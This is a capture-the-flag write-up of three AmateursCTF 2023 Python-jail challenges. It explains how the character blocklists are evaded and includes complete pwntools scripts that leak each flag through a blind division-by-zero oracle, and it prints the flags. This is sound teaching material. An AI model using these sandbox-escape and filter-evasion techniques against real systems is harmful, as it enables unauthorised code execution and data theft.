---
title: Writeup - Censorship (AmateursCTF 2023)
date: 2023-07-18 00:00:01
tags: 
- writeup
- jail
- amateursctf2023
---

# AmateursCTF 2023 - Censorship, Censorship Lite, & Censorship Lite++
## Censorship Description
```markdown
I'll let you run anything on my python program as long as you don't try to 
print the flag or violate any of my other rules! Pesky CTFers...

nc amt.rs 31670

[main.py]
```

## Censorship Lite Description
```markdown
There was clearly not enough censorship last time. This time it's lite:tm:. I'm 
afraid now you'll never get in to my system! Unfortunate for those pesky CTFers. 
Better social engineer an admin for the flag!!!!

nc amt.rs 31671

[main.py]
```

## Writeup
I solved Censorship and Censorship Lite with the same script/approach, so I'm going to explain my solution to those two simultaneously. Then, I'll explain how I solved Censorship Lite++ because I had to change my approach a bit for that problem. 

Since Censorship Lite's jail setup is the same as Censorship (except **MORE** restrictive), we're only going to look at Censorship Lite's [main.py](/static/amactf-censored/main_censored_lite.py) file (regular Censorship [main.py here](/static/amactf-censored/main_censored.py)):

```python
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "\lite0123456789"]):
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

Let's break apart this jail into English for a second. The flag is stored in 2 variables, called `flag` and `_`. Your input is passed through the `ascii()` function, which both turns it into a string and escapes Unicode/hex encodings. Before the input is executed, the program checks for a number of things: any digits, the letters `l`, `i`, `t`, `e`, and the backslash `\`. If the checks pass, the code is thrown in an `exec()` statement. You'll notice that there's actually an `eval()` inside, this doesn't give you an extra functionality since the `ascii()` function turned it into a string. It's kind of a funky setup, but I think of it this way - the `ascii()` function and `eval()` function cancel each other out, while not providing any benefit for us **AND** preventing the use of unicode. 

Okay, so what's the goal, and what are the roadblocks? The goal is to <u>print out/leak the `flag` or `_` variable</u>. The roadblocks are:

* No Unicode (which blocks a whole slew of pyjail tricks 😢)
* No backslash (no hex/octal encodings)
* No digits (makes number-based indexing really hard [but not impossible!])
* No letters `l`, `i`, `t`, `e` (which *severely* limits the built-in functions we can use)

However, there is a silver lining or two:

* `exec()` is used to run the code instead of `eval()`, opening up the Python functionality we can use (i.e. `import`, function/variable definition, etc.)
* The code runs in a `while True` loop, meaning we can run our input as many times as we want. This makes variable definition much more useful. 
* Errors are printed out. While I didn't take an error-based approach, I'm fairly certain you could leak the flag through the error message.

### Approach
After a bit of thinking and ideating, I decided on a <u>boolean-based blind brute force approach</u> (say *that* five times fast!) that all hinges on the `division by zero` error. This is how it would work:

* `1/1` is valid in Python and will not through an error. However `1/0` is NOT valid and the following error will be thrown - `ZeroDivisionError: division by zero`
* If (hypothetically speaking) the first character of the flag is `a` (which we know due to the flag format), then the following code would throw an error - `1/(flag[0]-ord('a'))`. This is because `ord('a')` and `flag[0]` are the same number, so it would become 0 and throw an error. However, if we did `1/(flag[0]-ord('b'))`, no error would be thrown because `flag[0]-ord('b')` does not return 0. 
* Based on this approach, we can put different characters in the `ord()` function, and if a `division by zero` error is thrown, we know we have the right flag at that index!!

### Bypassing Roadblocks
Alright, our approach would work, but we will have to heavily modify our code to get past these roadblocks. First, the letter `l` is blocked, so we'll replace the `flag` variable with `_`. I also just went with raw numbers instead of `ord('b')` (which in retrospect doesn't make any sense, since a majority of the characters are still allowed). So that means we have our payload set to: `1/(_[0]-57)`. 

Now, the next part is getting numbers back. After searching through built-ins that were allowed, I discovered that `sum([])` returns 0. Then, I can use `~sum([])` for -1 and `abs(~sum([]))` for one. Since `+` is allowed, at this point we can just chain `sum([])` together a bunch of times to make whatever number we want. For example, `1/(_[0]-57)` now becomes `abs(~sum([]))/(_[sum([])]-(sum([])+sum([])+sum([])+...))`. Now that this works, we can go ahead and script it!

### Scripting
I used `pwntools` to make the socket connection easy. A connection is established, and different characters (turned into numbers, represented by the chained `sum([])` statements) are tried for each flag index until an error is returned. Once it's returned, that character is added to the flag until a `}` (closing bracket) is added. The [script](/static/amactf-censored/solve1.py) is below:

```
from pwn import *

# initializations
ONE = "abs(~sum([]))+"
flag = "a"

# helper function
def send_code(code: str):
    p.sendline(code.encode())
    return p.recvuntil(b'Give code: ').decode().split("Give")[0]


# start connection and flush
p = remote('amt.rs', 31671)
p.sendline(b'_')
p.recvuntil(b'Give code: ')
p.recvuntil(b'Give code: ')


while '}' not in flag:
    current_index = len(flag)
    for i in range(0x20, 0x7e):
        payload = f'abs(~sum([]))/(ord(_[{(ONE*current_index)[:-1]}])-({(ONE*i)[:-1]}))'
        #print(payload)

        out = send_code(payload)

        if 'zero' in out:
            flag += chr(i)
            print(flag)
            break
        elif out == '':
            continue
        else:
            print(out)
            exit()

p.close()
```

<img src="/static/amactf-censored/flag.png" width="500px">

**Flag:** `amateursCTF{i_l0v3_overwr1t1nG_functions..:D}` (Censored)

**Flag:** `amateursCTF{sh0uld'v3_r3strict3D_p4r3nTh3ticaLs_1nst3aD}` (Censored Lite)


## Censorship Lite++ Description
```markdown
I've gotten tired of everyone opening shells on my computer, so I'm increasing 
the size of the blocklist. I'm not sure how you got into the previous one, but 
you definitely can't get into this one. (Flag format is amateursCTF{[a-zA-Z_]*}, 
for any CTFers looking to social engineer an admin for the flag).

nc amt.rs 31672

[main.py]
```

## Writeup

Here is the updated [main.py](/static/amactf-censored/main_censored_lite++.py) file:

```python
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```

The main changes are that error text isn't printed, and several symbols have been added to the blocklist. Our approach will still work because the exact content of the error message doesn't matter, and the slash (`/`) is still allowed. In addition, we can access flag characters through `_[?]` still. Our main issue is that we need to figure out how to access numbers a different way. 

For a second, I entertained the idea of overwriting the `any()` function to somehow ALWAYS return false but overwriting the definition with another built-in, but that didn't work (for example, `any=max` would still trigger the `"invalid input"` line when a blacklist character was introduced). I made a list of built-ins I could use, but I couldn't call them because parentheses (`()`) were blocked. I couldn't even use a decorator to call them since a class had to be defined afterwards, and the colon (`:`) was prohibited. 

After a while of playing around in the terminal, I remembered one very key idea - `True == 1` and `False == 0`! That was how I could recover numbers. Remembering this also solved my other problem - I could run `ord(_[0])` because that required `()`, however if I just compared the text as a string `_[0] == 'f'`, the result would either be True or False, and our method for detecting a correct character would still apply. 

It would be backwards tho, let me explain. If we did `True/(_[False]=='a')`, then the denominator would evaluate to True, and the result would be `1/1`, so no error. **HOWEVER**, if the character was incorrect, then the result would be `1/0`, so an error was thrown. So now, we knew the character was correct if NO error was thrown.

### Scripting
Some pretty heavy modifications were required to script this. In addition, instead of chaining together statements to get large numbers, I used the `while True` loop to my advantage and defined my own variables for numbers. I initially defined "primities":

```python
# base numbers
send_code("a='b'=='b'")                 # a = True
send_code("b=~a")                       # b = -2
send_code("c=a+b")                      # c = -1
send_code("d=c+a")                      # d = 0
send_code("f=d+a")                      # f = 1

# multiples of f give 2 - 10 & 14
send_code("ff=f+f")                     # ff = 2
send_code("fff=ff+f")                   # fff = 3
send_code("ffff=fff+f")                 # ffff = 4
send_code("fffff=ffff+f")               # fffff = 5
send_code("ffffff=fffff+f")             # ffffff = 6
send_code("fffffff=ffffff+f")           # fffffff = 7
send_code("ffffffff=fffffff+f")         # ffffffff = 8
send_code("fffffffff=ffffffff+f")       # fffffffff = 9
send_code("ffffffffff=fffffffff+f")     # ffffffffff = 10
send_code("ffffffffffffff=ffffffffff+ffff")     # ffffffffffffff = 14 (this is used for later)
```

Now, for the second part of the `==` statement in the denominator, I could use `'a'`, `'b'`, `'c'`, and most other letters, but there were 4 that I couldn't use since they were blocked. I took the same approaching of defining primitives for them by using the statement `'%s'%ord`, which used a format string to generate the string `'<built-in function ord>'`. I then used subscripts to get `l`, `i`, and `t`. For e, I used a hex format string with the number 14: `'%x'%ffffffffffffff`. 

```python
# Retrieve unusable ASCII chars
send_code("g='%s'%ord")                 # g = '<built-in function ord>'
send_code("z=g[ffff]")                  # z = 'l'
send_code("y=g[fff]")                   # y = 'i'
send_code("x=g[fffff]")                 # x = 't'
send_code("w='%x'%ffffffffffffff")      # w = 'e'
```

Once these primitives were defined, I made another `while True` loop that would test for errors by trying different letters. Note that since I couldn't use parenthesis to specify order of operations, I just defined intermittent variables and used them later (like `p` for the denominator).

Here's my final [solve script](/static/amactf-censored/solve2.py):

```python
from pwn import *

# initializations
flag = "amateursCTF{"

# helper function
def send_code(code: str):
    p.sendline(code.encode())
    return p.recvuntil(b'Give code: ').decode().split("Give")[0]


# start connection and flush
p = remote('amt.rs', 31672)
p.sendline(b'_')
p.recvuntil(b'Give code: ')
p.recvuntil(b'Give code: ')



### DEFINE PRIMITIVES ###
# base numbers
send_code("a='b'=='b'")                 # a = True
send_code("b=~a")                       # b = -2
send_code("c=a+b")                      # c = -1
send_code("d=c+a")                      # d = 0
send_code("f=d+a")                      # f = 1

# multiples of f give 2 - 10, 14
send_code("ff=f+f")                     # ff = 2
send_code("fff=ff+f")                   # fff = 3
send_code("ffff=fff+f")                 # ffff = 4
send_code("fffff=ffff+f")               # fffff = 5
send_code("ffffff=fffff+f")             # ffffff = 6
send_code("fffffff=ffffff+f")           # fffffff = 7
send_code("ffffffff=fffffff+f")         # ffffffff = 8
send_code("fffffffff=ffffffff+f")       # fffffffff = 9
send_code("ffffffffff=fffffffff+f")     # ffffffffff = 10
send_code("ffffffffffffff=ffffffffff+ffff")     # ffffffffffffff = 14

# Retrieve unusable ASCII chars
send_code("g='%s'%ord")                 # g = '<built-in function ord>'
send_code("z=g[ffff]")                  # z = 'l'
send_code("y=g[fff]")                   # y = 'i'
send_code("x=g[fffff]")                 # x = 't'
send_code("w='%x'%ffffffffffffff")      # w = 'e'

# define alphabet dictionary
alphabet = {
    'a': "'a'", 'b': "'b'", 'c': "'c'", 'd': "'d'", 'e': "w", 'f': "'f'", 'g': "'g'", 'h': "'h'", 'i': "y", 'j': "'j'", 'k': "'k'", 'l': "z", 'm': "'m'", 'n': "'n'", 'o': "'o'", 'p': "'p'", 'q': "'q'", 'r': "'r'", 's': "'s'", 't': "x", 'u': "'u'", 'v': "'v'", 'w': "'w'", 'x': "'x'", 'y': "'y'", 'z': "'z'", 'A': "'A'", 'B': "'B'", 'C': "'C'", 'D': "'D'", 'E': "'E'", 'F': "'F'", 'G': "'G'", 'H': "'H'", 'I': "'I'", 'J': "'J'", 'K': "'K'", 'L': "'L'", 'M': "'M'", 'N': "'N'", 'O': "'O'", 'P': "'P'", 'Q': "'Q'", 'R': "'R'", 'S': "'S'", 'T': "'T'", 'U': "'U'", 'V': "'V'", 'W': "'W'", 'X': "'X'", 'Y': "'Y'", 'Z': "'Z'", '_': "'_'"
}


while '}' not in flag:
    current_index = len(flag)
    for letter in alphabet:
        # define payload
        index = "ffffffffff+"*(current_index//10)+"f"*(current_index%10)
        if index[-1] == "+":
            index = index[:-1]

        payload = f"p=_[{index}]=={alphabet[letter]}"
        #print(payload)
        send_code(payload)

        # check if division by zero error
        out = send_code("f/p")

        if 'zzzzzzzzzzzzz' not in out:
            flag += letter
            print(flag)
            break

p.close()
```

**Flag:** `amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}`